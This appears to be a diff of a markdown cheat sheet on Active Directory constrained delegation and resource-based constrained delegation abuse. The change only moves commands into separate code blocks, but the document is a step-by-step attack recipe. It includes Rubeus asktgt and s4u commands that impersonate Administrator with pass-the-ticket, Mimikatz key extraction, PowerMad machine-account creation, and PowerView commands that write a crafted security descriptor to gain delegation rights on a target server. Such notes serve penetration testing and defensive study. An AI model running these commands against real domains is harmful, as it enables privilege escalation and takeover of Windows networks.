@@ -39,7 +39,10 @@ description: Various attack prototypes for Constrained Delegation Abuse
 ## Basic Constrained Delegation Exploitation
 
 1. To perform the delegation, we ultimately need the TGT of the principal (machine or user) trusted for delegation.  We can extract it from a machine (Rubeus `dump`) or request one using the NTLM / AES keys (Mimikatz `sekurlsa::ekey`s + Rubeus `asktgt)`: ```.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892......```
-2. Use `s4u2self` and `s4u2proxy` to impersonate the Target user delegated to the allowed SPN: ```.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/dc /ptt```
+2. Use `s4u2self` and `s4u2proxy` to impersonate the Target user delegated to the allowed SPN: 
+```
+.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/dc /ptt
+```
 
 ## Alternate Service Name Abuse
 
@@ -63,7 +66,10 @@ description: Various attack prototypes for Constrained Delegation Abuse
 - If we compromise a frontend service that appears in the RBCD property of a backend service, exploitation is the same as with constrained delegation above. This is however not too common.
 - A more often-seen attack to RBCD is when we have *GenericWrite, GenericAll, WriteProperty, or WriteDACL* permissions to a computer object in the domain. This means we can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.
 1. Create a new machine account using PowerMad: ```New-MachineAccount -MachineAccount NewMachine -Password $(ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)```
-2. Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target: ```$sid = Get-DomainComputer -Identity NewMachine -Properties objectsid | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"; $SDbytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDbytes,0)```
+2. Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target:
+```
+$sid = Get-DomainComputer -Identity NewMachine -Properties objectsid | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"; $SDbytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDbytes,0)
+```
 3. Use PowerView to use our `GenericWrite` (or similar) priv to apply this SD to the target: ```Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}```
 4. Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target: ```.\Rubeus.exe s4u /user:NewMachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv.targetdomain.com /ptt```
 
